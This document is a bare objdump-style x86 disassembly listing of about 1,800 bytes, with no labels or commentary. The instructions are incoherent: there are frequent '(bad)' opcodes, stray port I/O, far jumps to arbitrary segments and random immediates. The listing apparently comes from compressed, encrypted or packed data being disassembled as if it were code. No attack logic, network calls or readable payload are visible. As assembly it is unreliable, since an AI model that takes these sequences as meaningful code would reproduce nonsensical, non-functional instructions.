  4213ca:	aaa    
  4213cb:	daa    
  4213cc:	sbb    ecx,ebp
  4213ce:	sub    DWORD PTR [ecx+0x16],eax
  4213d1:	out    0x3b,al
  4213d3:	or     DWORD PTR [edx+esi*2-0x33],0xffffffa2
  4213d8:	or     edi,DWORD PTR [edx+ecx*8-0x20]
  4213dc:	aaa    
  4213dd:	inc    esi
  4213de:	(bad)  
  4213df:	jmp    FWORD PTR [edx+0x30a9da0d]
  4213e5:	stc    
  4213e6:	das    
  4213e7:	push   eax
  4213e8:	dec    eax
  4213e9:	dec    esi
  4213ea:	mov    bl,0xf9
  4213ec:	fdiv   QWORD PTR [eax]
  4213ee:	stos   BYTE PTR es:[edi],al
  4213ef:	xor    eax,edi
  4213f1:	xchg   esi,eax
  4213f2:	sub    al,0x16
  4213f4:	sbb    eax,0x920d4d24
  4213f9:	mov    ebp,DWORD PTR [ecx]
  4213fb:	jle    0x421444
  4213fd:	scas   eax,DWORD PTR es:[edi]
  4213fe:	popa   
  4213ff:	bound  edx,QWORD PTR [ecx+edi*4+0x4b2060f8]
  421406:	test   dl,0xbd
  421409:	(bad)  
  42140a:	pop    esi
  42140b:	mov    eax,0x910cf14e
  421410:	stos   DWORD PTR es:[edi],eax
  421411:	stos   DWORD PTR es:[edi],eax
  421412:	mov    DWORD PTR [edi-0xa],ebp
  421415:	xlat   BYTE PTR ds:[ebx]
  421416:	inc    ebx
  421417:	addr16 or al,0xf3
  42141a:	mov    esi,DWORD PTR [edi-0x16]
  42141d:	mov    ds:0x4ac094b4,eax
  421422:	in     al,0x49
  421424:	sar    BYTE PTR [ebx],cl
  421426:	push   eax
  421427:	fwait
  421428:	lds    esp,FWORD PTR [ebx]
  42142a:	(bad)  
  42142b:	iret   
  42142c:	mov    ecx,0x463e812c
  421431:	lods   al,BYTE PTR ds:[esi]
  421432:	or     al,0x99
  421434:	sbb    dh,BYTE PTR [ecx+eiz*2-0x576f3940]
  42143b:	mov    eax,edi
  42143d:	shl    DWORD PTR [edi-0x7d],1
  421440:	dec    esp
  421441:	outs   dx,BYTE PTR ds:[esi]
  421442:	xchg   ebp,esi
  421444:	scas   al,BYTE PTR es:[edi]
  421445:	in     al,dx
  421446:	jmp    0x87e:0x5ed10868
  42144d:	mov    ah,0x52
  42144f:	(bad)  
  421450:	imul   ecx,DWORD PTR [ebx+0x17],0x335a9151
  421457:	inc    eax
  421458:	add    al,0x2f
  42145a:	jne    0x4214a5
  42145c:	scas   eax,DWORD PTR es:[edi]
  42145d:	push   esi
  42145e:	jno    0x421418
  421460:	(bad)  
  421461:	xor    BYTE PTR [edx+0x42a848d6],ah
  421467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421468:	lahf   
  421469:	cdq    
  42146a:	popa   
  42146b:	mov    bl,0xfa
  42146d:	pop    edi
  42146e:	and    ah,BYTE PTR [edi]
  421470:	repnz xchg ebx,eax
  421472:	jb     0x421410
  421474:	xchg   DWORD PTR [ebx+ebp*1],ecx
  421477:	dec    ebp
  421478:	sbb    ebp,DWORD PTR [eax+0x69d7a7cf]
  42147e:	(bad)  
  42147f:	ins    DWORD PTR es:[edi],dx
  421480:	ins    DWORD PTR es:[edi],dx
  421481:	inc    esi
  421482:	cmp    bl,BYTE PTR [esi-0x5135202a]
  421488:	aam    0xc5
  42148a:	addr16 test al,0x42
  42148d:	push   ds
  42148e:	or     al,BYTE PTR [ecx-0x2e32890f]
  421494:	mov    bl,0x13
  421496:	scas   al,BYTE PTR es:[edi]
  421497:	aaa    
  421498:	jecxz  0x421488
  42149a:	aad    0x4
  42149c:	dec    esp
  42149d:	xchg   edi,eax
  42149e:	test   BYTE PTR [bx+si],cl
  4214a1:	push   0xc63fbdfb
  4214a6:	mov    esp,esp
  4214a8:	xchg   esp,eax
  4214a9:	dec    ebx
  4214aa:	bnd jo 0x4214b3
  4214ad:	iret   
  4214ae:	fadd   DWORD PTR [ecx+0x7e]
  4214b1:	bound  ebp,QWORD PTR [ecx]
  4214b3:	lods   eax,DWORD PTR ds:[esi]
  4214b4:	popf   
  4214b5:	mov    WORD PTR [ecx-0xc4c2740],gs
  4214bb:	je     0x42147e
  4214bd:	sbb    ah,ch
  4214bf:	jae    0x4214fc
  4214c1:	(bad)  
  4214c2:	jno    0x421499
  4214c4:	shl    BYTE PTR [ebp+ebx*4-0x3a],0x20
  4214c9:	sub    al,al
  4214cb:	mov    dl,0x20
  4214cd:	adc    ah,BYTE PTR [edi+ebp*4-0x675df6ad]
  4214d4:	cmc    
  4214d5:	ss scas al,BYTE PTR es:[edi]
  4214d7:	loope  0x4214d8
  4214d9:	jl     0x421494
  4214db:	sub    ebx,DWORD PTR [ebx+0x7c]
  4214de:	and    al,0x3d
  4214e0:	inc    esi
  4214e1:	(bad)  ds:0xe3984ac4
  4214e7:	rcr    BYTE PTR [ebx],1
  4214e9:	mov    dl,0x8
  4214eb:	pushf  
  4214ec:	push   eax
  4214ed:	cmc    
  4214ee:	add    BYTE PTR [ebp-0x57],bl
  4214f1:	sahf   
  4214f2:	push   edx
  4214f3:	jae    0x42153d
  4214f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214f6:	daa    
  4214f7:	daa    
  4214f8:	xchg   esp,eax
  4214f9:	lock add eax,0x6ccb8ae9
  4214ff:	pop    ebp
  421500:	xchg   ebp,eax
  421501:	or     esp,ebx
  421503:	nop
  421504:	mov    ds,WORD PTR [esi+0x7e2a4ac7]
  42150a:	mov    dl,0xd6
  42150c:	xor    edx,DWORD PTR es:[ebx]
  42150f:	cmp    DWORD PTR [edi+0x8],edx
  421512:	sbb    eax,0x2069ce97
  421517:	loope  0x421508
  421519:	sub    bh,BYTE PTR [eax]
  42151b:	mov    ah,0x17
  42151d:	aaa    
  42151e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151f:	retf   0x5215
  421522:	mov    bl,0xf0
  421524:	loop   0x421567
  421526:	jmp    0x2e35f397
  42152b:	dec    ebx
  42152c:	xor    cl,al
  42152e:	cmp    al,0xa5
  421530:	into   
  421531:	dec    esp
  421532:	call   0x43077566
  421537:	sbb    edi,DWORD PTR [ebx-0x61]
  42153a:	jcxz   0x42150e
  42153d:	pop    ecx
  42153e:	mov    eax,ds:0x55170dc8
  421543:	jmp    0x577e8ea3
  421548:	pop    edi
  421549:	push   edx
  42154a:	xor    cl,BYTE PTR [ebx]
  42154c:	ins    BYTE PTR es:[edi],dx
  42154d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42154e:	push   0x617b6336
  421553:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421554:	xchg   DWORD PTR [ecx],eax
  421556:	outs   dx,DWORD PTR ds:[esi]
  421557:	popa   
  421558:	fild   QWORD PTR [eax]
  42155a:	add    ebx,0x5b421c0f
  421560:	jbe    0x4215b7
  421562:	cmp    eax,0xa87787f7
  421567:	push   ss
  421568:	fucomp st(1)
  42156a:	adc    eax,0x308e5bee
  42156f:	lods   eax,DWORD PTR ds:[esi]
  421570:	retf   0xd677
  421573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421574:	push   ebp
  421575:	(bad)  
  421577:	dec    esi
  421578:	or     al,BYTE PTR [ebp+0x7c5c5fa]
  42157e:	xlat   BYTE PTR ds:[ebx]
  42157f:	sub    al,0x7c
  421581:	xchg   esi,eax
  421582:	out    dx,al
  421583:	outs   dx,DWORD PTR ds:[esi]
  421584:	ja     0x421511
  421586:	mov    al,ds:0x14dde14d
  42158b:	jo     0x42153c
  42158d:	repnz sar DWORD PTR [eax],0x4f
  421591:	imul   ebx,DWORD PTR [eax],0x18e85874
  421597:	or     DWORD PTR [ebx],ecx
  421599:	cmc    
  42159a:	xchg   esi,eax
  42159b:	icebp  
  42159c:	fwait
  42159d:	out    dx,al
  42159e:	loop   0x421575
  4215a0:	xor    eax,0x22191861
  4215a5:	xchg   edx,eax
  4215a6:	loop   0x4215c2
  4215a8:	int3   
  4215a9:	dec    edi
  4215aa:	dec    eax
  4215ab:	adc    eax,0xbc0d0084
  4215b0:	mov    bl,BYTE PTR [esi+edi*4-0x5f68ce29]
  4215b7:	or     BYTE PTR [edi],ch
  4215b9:	sbb    bh,al
  4215bb:	neg    DWORD PTR [ebp+0x223a832a]
  4215c1:	je     0x421556
  4215c3:	add    eax,DWORD PTR [edx+edx*2+0x31]
  4215c7:	(bad)  
  4215c9:	xor    BYTE PTR [ebx+0x7e],ch
  4215cc:	mov    ah,0xba
  4215ce:	lahf   
  4215cf:	pop    edi
  4215d0:	ret    
  4215d1:	loop   0x421614
  4215d3:	or     DWORD PTR [edx-0x34f0e29c],0xffffffd9
  4215da:	pop    esp
  4215db:	cmp    bl,al
  4215dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215de:	mov    DWORD PTR [edi],ebp
  4215e0:	pop    eax
  4215e1:	sub    edi,DWORD PTR [edi+esi*1+0x7d]
  4215e5:	or     al,0x38
  4215e7:	jg     0x42163d
  4215e9:	hlt    
  4215ea:	fcomp  DWORD PTR [ebx+ecx*2-0x21]
  4215ee:	sub    esi,edx
  4215f0:	jno    0x421589
  4215f2:	ret    
  4215f3:	jmp    0x692174bb
  4215f8:	jae    0x4215a2
  4215fa:	xor    BYTE PTR [eax],cl
  4215fc:	and    esi,0xffffff8b
  4215ff:	fiadd  DWORD PTR [ebx]
  421601:	xchg   ebp,eax
  421602:	rol    DWORD PTR [ebp+0x33066d2f],0x3
  421609:	dec    ebp
  42160a:	dec    esp
  42160b:	imul   esp,DWORD PTR [bx+si-0x4a48],0xaac8b442
  421614:	mov    dh,0x24
  421616:	sub    ah,al
  421618:	in     al,dx
  421619:	outs   dx,DWORD PTR ds:[esi]
  42161a:	js     0x4215c6
  42161c:	ins    BYTE PTR es:[edi],dx
  42161d:	cmp    DWORD PTR [ebp-0x2476b49c],0xdbf52e08
  421627:	cmp    edx,edx
  421629:	rol    BYTE PTR [eax],cl
  42162b:	mov    edi,0x853cd308
  421630:	in     eax,dx
  421631:	push   ss
  421632:	sbb    eax,0xabaadde9
  421637:	(bad)  
  421639:	mov    ch,0xc3
  42163b:	lods   eax,DWORD PTR ds:[esi]
  42163c:	fcomi  st,st(3)
  42163e:	frstor [esi+edx*8-0x5a]
  421642:	adc    edx,edx
  421644:	sahf   
  421645:	fld    TBYTE PTR [ebp-0x4be2b46a]
  42164b:	out    dx,eax
  42164c:	ss mov ch,0xc3
  42164f:	dec    ebp
  421650:	inc    edx
  421651:	xchg   ebx,eax
  421652:	into   
  421653:	mov    cl,0xcf
  421655:	or     DWORD PTR [edx-0x6d],ebp
  421658:	cmp    eax,DWORD PTR [eax-0x3b97c902]
  42165e:	scas   al,BYTE PTR es:[edi]
  42165f:	ins    BYTE PTR es:[edi],dx
  421660:	jmp    0xa850f294
  421665:	pop    esi
  421666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421667:	mov    edi,0x7625dc80
  42166c:	xchg   edx,eax
  42166d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42166f:	push   esi
  421670:	adc    al,0x6d
  421672:	mov    eax,ds:0x2cfcfa41
  421677:	fneni(8087 only) 
  421679:	add    DWORD PTR [ebp-0x4dc4ec0e],edx
  42167f:	pop    es
  421680:	and    eax,DWORD PTR [ecx+0x6c9efc01]
  421686:	push   eax
  421687:	jno    0x4216e8
  421689:	and    eax,0x485359e9
  42168e:	add    eax,0x3dc1accf
  421693:	into   
  421694:	pop    eax
  421695:	and    al,0x42
  421697:	sbb    bx,WORD PTR [edi-0x30aaea59]
  42169e:	loopne 0x421706
  4216a0:	mov    cl,0xf7
  4216a2:	pop    ds
  4216a3:	aaa    
  4216a4:	stc    
  4216a5:	inc    edi
  4216a6:	jg     0x421678
  4216a8:	adc    eax,0xac11c19d
  4216ad:	cmp    al,BYTE PTR [ebp-0x3f4ce695]
  4216b3:	and    BYTE PTR [eax-0x704fcba0],cl
  4216b9:	bound  esp,QWORD PTR [ebp+0x1cf6378]
  4216bf:	loope  0x421712
  4216c1:	mov    al,0xf0
  4216c3:	pushf  
  4216c4:	cli    
  4216c5:	adc    esi,eax
  4216c7:	xchg   esp,eax
  4216c8:	jno    0x42170a
  4216ca:	fadd   DWORD PTR [edi+0x58]
  4216ce:	outs   dx,BYTE PTR ds:[esi]
  4216cf:	pop    es
  4216d0:	xchg   ebx,eax
  4216d1:	out    dx,eax
  4216d2:	xchg   ebx,eax
  4216d3:	popa   
  4216d4:	jne    0x4216c3
  4216d6:	test   eax,0xf4a08a43
  4216dc:	cmp    BYTE PTR [ebp-0x23],bl
  4216df:	push   ss
  4216e0:	adc    ebx,DWORD PTR [ecx+edx*1]
  4216e3:	out    0x2b,al
  4216e5:	jae    0x42170f
  4216e7:	int3   
  4216e8:	or     ebx,DWORD PTR [esi]
  4216ea:	cmp    DWORD PTR [ecx+0x5d],ebx
  4216ed:	sub    al,0x86
  4216ef:	jmp    0x4216ee
  4216f1:	(bad)  [esi+0x4e]
  4216f4:	or     esi,eax
  4216f6:	fld    TBYTE PTR ds:0xd4d85dbd
  4216fc:	mov    ds:0x6fdf6113,al
  421701:	sub    al,0xba
  421703:	shr    BYTE PTR [edi+0x9ba2c48],0x9e
  42170a:	mov    cl,0xf2
  42170c:	out    dx,al
  42170d:	stc    
  42170e:	enter  0x70db,0xca
  421712:	inc    ebp
  421713:	pop    eax
  421714:	iret   
  421715:	push   ebp
  421716:	xor    al,0x80
  421718:	dec    ebp
  421719:	data16 jge 0x42169f
  42171c:	or     al,0xf8
  42171e:	cld    
  42171f:	jmp    0xc19b:0xb8968745
  421726:	fiadd  WORD PTR [edx+0x60]
  421729:	jp     0x421774
  42172b:	popa   
  42172c:	mov    esi,0x98ac9203
  421731:	cmc    
  421732:	cmc    
  421733:	(bad)  
  421734:	leave  
  421735:	mov    dl,0xe0
  421737:	dec    ebp
  421738:	add    eax,0x51cc14db
  42173d:	adc    DWORD PTR [esp+edx*4-0x16ce7ee2],ecx
  421744:	xchg   esi,eax
  421745:	dec    ecx
  421746:	sahf   
  421747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421748:	loopne 0x4216fa
  42174a:	push   eax
  42174b:	or     eax,0xbd01db15
  421750:	or     ch,dh
  421752:	sahf   
  421753:	lods   al,BYTE PTR ds:[esi]
  421754:	cmp    eax,0x497bd39c
  421759:	xor    DWORD PTR [ebp-0x5],0x4a
  42175d:	mov    eax,DWORD PTR [edx-0x40671eab]
  421763:	sub    al,0xbf
  421765:	adc    DWORD PTR [edi-0x27452392],edi
  42176b:	cwde   
  42176c:	push   ebp
  42176d:	push   ecx
  42176e:	(bad)  
  42176f:	jle    0x421795
  421771:	mov    ecx,DWORD PTR [edx]
  421773:	add    eax,0x8311361a
  421778:	out    0x10,eax
  42177a:	push   edx
  42177b:	scas   al,BYTE PTR es:[edi]
  42177c:	inc    ecx
  42177d:	or     al,0x9c
  42177f:	jle    0x421726
  421781:	adc    dl,cl
  421783:	and    BYTE PTR [eax-0x5c],bl
  421786:	sbb    DWORD PTR gs:[edi+0x67],ebp
  42178a:	xor    DWORD PTR [eax+eiz*1+0x7818234b],0x68
  421792:	cmp    edx,ebx
  421794:	std    
  421795:	shl    DWORD PTR [edi+ebp*1],0xb9
  421799:	ss scas eax,DWORD PTR es:[edi]
  42179b:	je     0x421721
  42179d:	mov    al,ds:0xb279656f
  4217a2:	out    0x97,al
  4217a4:	and    bh,BYTE PTR [eax+edx*4-0x12]
  4217a8:	push   esp
  4217a9:	xchg   esp,eax
  4217aa:	mov    ebx,0x59c8dce4
  4217af:	inc    esp
  4217b0:	push   0x66
  4217b2:	(bad)  
  4217b3:	mov    dl,0x76
  4217b5:	std    
  4217b6:	aaa    
  4217b7:	pop    edi
  4217b8:	shr    al,1
  4217ba:	sub    eax,DWORD PTR [ebp+0x1cd4ae6c]
  4217c0:	loopne 0x421743
  4217c2:	inc    esp
  4217c3:	gs loope 0x421844
  4217c6:	sti    
  4217c7:	add    DWORD PTR [ebp-0x66b2ac95],esi
  4217cd:	cmp    DWORD PTR [esi-0x4ed4acfb],edx
  4217d3:	pop    esi
  4217d4:	push   esi
  4217d5:	bswap  ebx
  4217d7:	pop    edi
  4217d8:	mov    eax,ds:0x329b5bf9
  4217dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217de:	cmp    eax,0x6454820d
  4217e3:	out    0x8d,eax
  4217e5:	or     ebx,DWORD PTR [edi-0x3ed3dfc6]
  4217eb:	call   0x8daa:0xde0e6839
  4217f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217f3:	push   ebx
  4217f4:	ins    DWORD PTR es:[edi],dx
  4217f5:	mov    BYTE PTR [esi-0x15],cl
  4217f8:	cmc    
  4217f9:	pop    ss
  4217fa:	jo     0x4217ef
  4217fc:	mov    WORD PTR ds:0x1c4e3d8d,ss
  421802:	add    cl,ch
  421804:	xor    bl,BYTE PTR [ecx]
  421806:	dec    ebp
  421807:	push   0xffffffd0
  421809:	mov    edx,0xd0d43b1c
  42180e:	and    BYTE PTR [ecx],dh
  421810:	loop   0x42188c
  421812:	ficomp DWORD PTR [esi]
  421814:	mov    cl,0x71
  421816:	in     al,0xa2
  421818:	inc    ebp
  421819:	push   ds
  42181a:	or     eax,0xff673511
  42181f:	xchg   ebx,eax
  421820:	or     ch,BYTE PTR [ecx]
  421822:	sahf   
  421823:	adc    ebx,DWORD PTR [ebx+0x53]
  421826:	xchg   DWORD PTR [esi+edx*8],edx
  421829:	mov    ch,0x32
  42182b:	mov    al,ds:0x1636597c
  421830:	cld    
  421831:	or     ebp,DWORD PTR [esp+ecx*4-0x63]
  421835:	ja     0x421834
  421837:	repnz fdivr QWORD PTR [edi]
  42183a:	dec    edi
  42183b:	mov    al,0xa2
  42183d:	enter  0xb0c9,0x31
  421841:	in     eax,dx
  421842:	push   edx
  421843:	dec    esi
  421844:	popa   
  421845:	jp     0x42180d
  421847:	jmp    0xc34a:0x9ba86567
  42184e:	popa   
  42184f:	or     DWORD PTR [ecx+0x65fb5b3a],ebp
  421855:	sbb    edi,DWORD PTR [edi]
  421857:	and    ah,bl
  421859:	xor    eax,0xc13aedc6
  42185e:	mov    BYTE PTR [ebx+eax*2],cl
  421861:	and    eax,0xbb43769c
  421866:	pop    ecx
  421867:	jg     0x4218e2
  421869:	jo     0x4218d9
  42186b:	mov    ds,WORD PTR [ecx]
  42186d:	xchg   ebx,eax
  42186e:	cmp    esp,DWORD PTR [eax-0x2994fa1e]
  421874:	out    dx,eax
  421875:	pop    esp
  421876:	arpl   WORD PTR [ebx-0x153ba3fa],di
  42187c:	mov    eax,DWORD PTR [edi]
  42187e:	enter  0x71f9,0x46
  421882:	mov    eax,0xea1b0b9b
  421887:	xor    edi,DWORD PTR [esi+0x6ae0201b]
  42188d:	xor    BYTE PTR [edx-0xf],ah
  421890:	cmp    ebp,ebx
  421892:	rcl    DWORD PTR [ecx-0x57c7b63a],0xb5
  421899:	push   edi
  42189a:	stc    
  42189b:	or     ah,BYTE PTR [esi+edx*8+0x6]
  42189f:	add    DWORD PTR [ecx],0x9628cf8
  4218a5:	(bad)  
  4218a6:	ds ss (bad) 
  4218a9:	and    esp,ecx
  4218ab:	imul   edx,ecx,0xdd5a194f
  4218b1:	rcl    DWORD PTR [esi+0x341ab197],0xa2
  4218b8:	and    bh,BYTE PTR [esi+0x29296c1b]
  4218be:	ss cmp eax,0x76621aba
  4218c4:	fld    TBYTE PTR [esi-0xde49e24]
  4218ca:	and    eax,0x74ccd49a
  4218cf:	out    dx,al
  4218d0:	popf   
  4218d1:	pusha  
  4218d2:	mov    ecx,0x49a66a04
  4218d7:	mov    al,0xbe
  4218d9:	test   DWORD PTR [edi],ecx
  4218db:	and    ebx,eax
  4218dd:	cmp    ebx,ecx
  4218df:	inc    edx
  4218e0:	popa   
  4218e1:	dec    eax
  4218e2:	dec    ecx
  4218e3:	cli    
  4218e4:	push   ss
  4218e5:	sar    BYTE PTR [ebx+0x4989c96d],0x1e
  4218ec:	retf   
  4218ed:	ror    DWORD PTR [edx],0x7
  4218f0:	push   ebp
  4218f1:	mov    gs,WORD PTR [ebx]
  4218f3:	pop    ecx
  4218f4:	pop    esi
  4218f5:	cmp    al,0xa5
  4218f7:	sbb    eax,edi
  4218f9:	inc    esi
  4218fa:	pop    esp
  4218fb:	in     al,0xd7
  4218fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218fe:	pop    eax
  4218ff:	cli    
  421900:	mov    dl,0x41
  421902:	add    eax,0x1e9e0168
  421907:	ds leave 
  421909:	jbe    0x4218c1
  42190b:	rol    BYTE PTR fs:[eax],1
  42190e:	dec    ecx
  42190f:	inc    ebx
  421910:	lds    ebx,FWORD PTR [edx]
  421912:	add    ebx,eax
  421914:	xchg   edi,eax
  421915:	test   esi,eax
  421917:	mov    edi,0x2f0a7a32
  42191c:	pop    eax
  42191d:	mov    eax,ds:0x8be7f6cc
  421922:	adc    ecx,eax
  421924:	and    cl,0x47
  421927:	ins    DWORD PTR es:[edi],dx
  421928:	pushf  
  421929:	and    al,0x43
  42192b:	ins    BYTE PTR es:[edi],dx
  42192c:	and    DWORD PTR [ebp+0x55],esi
  42192f:	and    eax,DWORD PTR ds:0x51f909b7
  421935:	mov    ?,WORD PTR [edi]
  421937:	bound  edx,QWORD PTR [edi-0x3]
  42193a:	mov    ecx,0xeaf11ab1
  42193f:	ret    0xbee0
  421942:	sub    eax,0xee6448bc
  421947:	push   ds
  421948:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421949:	add    BYTE PTR [edx+0x55de5679],0x6e
  421950:	or     BYTE PTR [esp+edx*8-0x1c8e464a],0x84
  421958:	jmp    0x42191b
  42195a:	xor    ah,BYTE PTR [ebx+0x4c]
  42195d:	frstor [edx-0x54]
  421960:	add    al,al
  421962:	dec    esi
  421963:	dec    edi
  421964:	pop    ecx
  421965:	fistp  QWORD PTR [ebp+0x342f918c]
  42196b:	neg    BYTE PTR [eax]
  42196d:	ret    
  42196e:	pop    eax
  42196f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421970:	or     DWORD PTR [edx],edx
  421972:	jns    0x421993
  421974:	fisubr DWORD PTR [edx+0x47]
  421977:	out    dx,eax
  421978:	sub    BYTE PTR [ecx-0x4700d03d],cl
  42197e:	push   eax
  42197f:	adc    BYTE PTR [eax],dh
  421981:	cld    
  421982:	int3   
  421983:	rol    BYTE PTR [esi],0xa6
  421986:	or     dh,BYTE PTR [edi]
  421988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421989:	sub    dh,BYTE PTR [ebx+0x9]
  42198c:	xor    al,0x3f
  42198e:	bound  edi,QWORD PTR [edi]
  421990:	add    BYTE PTR [edx+0xce642b8],bl
  421996:	test   eax,0xd8f8927a
  42199b:	cwde   
  42199c:	das    
  42199d:	mul    edx
  42199f:	xchg   ebp,eax
  4219a0:	add    BYTE PTR [ebp-0x3243224a],bl
  4219a6:	add    bl,BYTE PTR [edi-0x2c]
  4219a9:	mov    ecx,DWORD PTR [ebp-0x37]
  4219ac:	rol    DWORD PTR cs:[ebx-0x24],cl
  4219b0:	(bad)  
  4219b1:	nop
  4219b2:	lods   al,BYTE PTR ds:[esi]
  4219b3:	lds    esp,FWORD PTR [ebp+0x5a]
  4219b6:	pop    ebx
  4219b7:	cdq    
  4219b8:	sti    
  4219b9:	leave  
  4219ba:	push   ebx
  4219bb:	xchg   DWORD PTR ds:0x3eed9cfb,esp
  4219c1:	mov    edi,0x446af6a0
  4219c6:	push   eax
  4219c7:	int    0x95
  4219c9:	and    edx,DWORD PTR [edx-0x43]
  4219cc:	jae    0x421979
  4219ce:	adc    al,0xac
  4219d0:	clc    
  4219d1:	xor    BYTE PTR [eax+0x62],al
  4219d4:	fs aam 0xc0
  4219d7:	pushf  
  4219d8:	mov    ds:0xcce8c18b,eax
  4219dd:	adc    BYTE PTR [ebx+0x5c],dl
  4219e0:	aas    
  4219e1:	popa   
  4219e2:	ret    
  4219e3:	xchg   esi,eax
  4219e4:	cli    
  4219e5:	ins    DWORD PTR es:[edi],dx
  4219e6:	aad    0x3b
  4219e8:	test   eax,0xd028b499
  4219ed:	imul   edi,DWORD PTR [esi-0x8],0xb3327a6d
  4219f4:	add    al,0x15
  4219f6:	je     0x421a24
  4219f8:	pop    esp
  4219f9:	adc    eax,0x9fd4cb39
  4219fe:	xlat   BYTE PTR ds:[ebx]
  4219ff:	inc    ebx
  421a00:	dec    ecx
  421a01:	leave  
  421a02:	sub    DWORD PTR [edi],edx
  421a04:	js     0x4219f9
  421a06:	enter  0x8aca,0x56
  421a0a:	lods   eax,DWORD PTR ds:[esi]
  421a0b:	popf   
  421a0c:	xchg   esi,eax
  421a0d:	cmp    ebx,DWORD PTR [esi+0x24]
  421a10:	cmp    ebp,DWORD PTR [ebp-0x32]
  421a13:	xor    esi,esp
  421a15:	xor    al,0xee
  421a17:	push   ebp
  421a18:	(bad)  
  421a19:	pusha  
  421a1a:	jns    0x42199f
  421a1c:	fnsave [ebp-0x73]
  421a1f:	sub    edi,esp
  421a21:	loope  0x421a23
  421a23:	fisub  WORD PTR [edi]
  421a25:	mov    dh,0xac
  421a27:	dec    BYTE PTR [ebx+0x1decd666]
  421a2d:	cld    
  421a2e:	mov    cl,0xfb
  421a30:	xor    al,0x60
  421a32:	iret   
  421a33:	cmp    eax,0x5d55533
  421a38:	adc    al,0xa8
  421a3a:	repz popf 
  421a3c:	shl    bl,cl
  421a3e:	iret   
  421a3f:	inc    ebp
  421a40:	jbe    0x421a74
  421a42:	push   ebp
  421a43:	mov    esi,ebp
  421a45:	mov    DWORD PTR [ecx+0x7d],esp
  421a48:	cwde   
  421a49:	outs   dx,DWORD PTR ds:[esi]
  421a4a:	aaa    
  421a4b:	jle    0x421acc
  421a4d:	xchg   ecx,eax
  421a4e:	pop    edx
  421a4f:	dec    ebp
  421a50:	sbb    ebx,esp
  421a52:	ja     0x421a38
  421a54:	adc    al,0x1
  421a56:	lods   al,BYTE PTR ds:[esi]
  421a57:	adc    al,0x41
  421a59:	sub    BYTE PTR [ebx],ah
  421a5b:	mov    edx,0xb6bcdec6
  421a60:	in     eax,0x63
  421a62:	push   ebx
  421a63:	test   al,0x61
  421a65:	pop    edi
  421a66:	pop    edx
  421a67:	or     DWORD PTR [ebx],eax
  421a69:	add    dl,BYTE PTR [ecx+0x74550fbd]
  421a6f:	fwait
  421a70:	mov    dh,0xb5
  421a72:	mov    ds:0x206480ad,eax
  421a77:	dec    eax
  421a78:	mov    cl,0xcb
  421a7a:	ret    
  421a7b:	push   esi
  421a7c:	xchg   ebx,eax
  421a7d:	sbb    DWORD PTR [ebx-0x9],0x640bc16b
  421a84:	stos   BYTE PTR es:[edi],al
  421a85:	repnz inc ebp
  421a87:	lahf   
  421a88:	dec    esi
  421a89:	pop    esi
  421a8a:	stos   BYTE PTR es:[edi],al
  421a8b:	inc    BYTE PTR [ebx-0x63]
  421a8e:	and    DWORD PTR [esi+0x69989a3d],esi
  421a94:	ret    0x7c8b
  421a97:	jmp    0x421a59
  421a99:	outs   dx,BYTE PTR ds:[esi]
  421a9a:	cmp    esp,eax
  421a9c:	repnz inc eax
  421a9e:	ret    0xc99b
  421aa1:	and    dl,BYTE PTR [esi-0x79f26c33]
  421aa7:	in     eax,dx
  421aa8:	and    al,0xdb
  421aaa:	push   edi
  421aab:	cmc    
  421aac:	aad    0xa0
  421aae:	or     bh,BYTE PTR [ebx+0x8]
  421ab1:	jmp    0xa09e80c4
  421ab6:	inc    eax
  421ab7:	iret   
  421ab8:	push   ds
  421ab9:	aam    0xc
  421abb:	pusha  
  421abc:	xchg   edx,eax
  421abd:	jbe    0x421a5c
  421abf:	int3   
  421ac0:	xchg   ebp,eax
  421ac1:	xchg   BYTE PTR ds:0xcc753c92,dh
  421ac7:	pop    eax
  421ac8:	and    BYTE PTR [ecx-0x18],cl
  421acb:	mov    ebx,0x7c90b4ce
  421ad0:	aad    0xea
  421ad2:	pop    ebp
  421ad3:	dec    ebx
  421ad4:	jg     0x421b50
  421ad6:	in     al,0x1e
  421ad8:	xchg   BYTE PTR [esi+0x3849211b],ch
  421ade:	push   ds
  421adf:	arpl   WORD PTR ds:0xc6f0471c,bp
  421ae5:	ins    DWORD PTR es:[edi],dx
  421ae6:	fistp  WORD PTR [edx+edi*4+0x70]
  421aea:	xor    BYTE PTR [eax+0x2d56ee11],0xa3
  421af1:	push   esi
  421af2:	dec    ecx
  421af3:	aad    0x6e
  421af5:	js     0x421b05
  421af7:	js     0x421b62
  421af9:	and    BYTE PTR [eax],ah
  421afb:	sbb    DWORD PTR [ecx+0x5b9d00f6],0x40b6eab3
  421b05:	cdq    
  421b06:	dec    edx
  421b07:	test   eax,0x9140a8cc
  421b0c:	out    dx,al
  421b0d:	test   cl,0xd1
  421b10:	jnp    0x421af9
  421b12:	mov    dh,0x9d
  421b14:	lods   al,BYTE PTR ds:[esi]
  421b15:	or     eax,0xe7383b95
  421b1a:	jne    0x421aa1
  421b1c:	call   0x1745:0xcaffc6e
  421b23:	push   eax
  421b24:	je     0x421ac9
  421b26:	or     esp,DWORD PTR [edi-0x75]
  421b29:	cmp    BYTE PTR [eax],dh
  421b2b:	aas    
  421b2c:	cmp    eax,eax
  421b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b2f:	mov    ebx,0x468d44
  421b34:	pop    ss
  421b35:	popa   
  421b36:	jae    0x421b74
  421b38:	cdq    
  421b39:	aam    0x31
  421b3b:	daa    
  421b3c:	xor    eax,DWORD PTR [edi]
  421b3e:	aaa    
  421b3f:	push   ebx
